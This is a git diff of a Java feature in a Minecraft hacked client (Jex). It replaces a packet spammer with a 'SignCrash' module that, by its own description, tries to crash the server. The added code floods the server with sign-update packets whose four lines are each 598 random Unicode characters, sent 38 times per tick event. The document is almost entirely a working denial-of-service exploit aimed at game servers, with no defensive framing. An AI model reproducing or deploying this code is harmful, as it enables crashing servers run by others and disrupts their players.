@@ -8,37 +8,29 @@ import me.dustin.jex.event.misc.EventTick;
 import me.dustin.jex.event.player.EventPlayerPackets;
 import me.dustin.jex.feature.mod.core.Feature;
 import me.dustin.jex.feature.option.annotate.Op;
-import me.dustin.jex.helper.misc.ChatHelper;
 import me.dustin.jex.helper.misc.Wrapper;
 import me.dustin.jex.helper.network.NetworkHelper;
-import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
-import net.minecraft.util.Hand;
-import net.minecraft.util.hit.BlockHitResult;
-import net.minecraft.util.math.BlockPos;
-import net.minecraft.util.math.Direction;
-import net.minecraft.util.math.Vec3d;
+import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
 
 import java.util.Random;
 
-@Feature.Manifest(category = Feature.Category.MISC, description = "Spams various packets to the server. Likely to get you kicked instantly. (By BleachDrinker420)")
-public class PacketSpammer extends Feature {
+@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server by spamming sign updates packets. (By 0x150)")
+public class SignCrash extends Feature {
 
     @Op(name = "Packet Count", min = 1, max = 100, inc = 10)
-    public int packetCount = 15;
+    public int packetCount = 38;
     @Op(name = "Auto Disable")
     public boolean autoDisable = true;
 
-    public PacketSpammer() {
+    public SignCrash() {
         setFeatureCategory(Category.valueOf("CRASH"));
     }
 
     @EventPointer
     private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
+        UpdateSignC2SPacket packet = new UpdateSignC2SPacket(Wrapper.INSTANCE.getLocalPlayer().getBlockPos(), rndBinStr(598), rndBinStr(598), rndBinStr(598), rndBinStr(598));
         for (int i = 0; i < packetCount; i++) {
-            NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
-            NetworkHelper.INSTANCE.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
+            NetworkHelper.INSTANCE.sendPacket(packet);
         }
     }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));
 
@@ -47,4 +39,13 @@ public class PacketSpammer extends Feature {
         if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
             setState(false);
     }, new TickFilter(EventTick.Mode.PRE));
+
+    private String rndBinStr(int size) {
+        StringBuilder end = new StringBuilder();
+        for (int i = 0; i < size; i++) {
+            // 65+57
+            end.append((char) (new Random().nextInt(0xFFFF)));
+        }
+        return end.toString();
+    }
 }
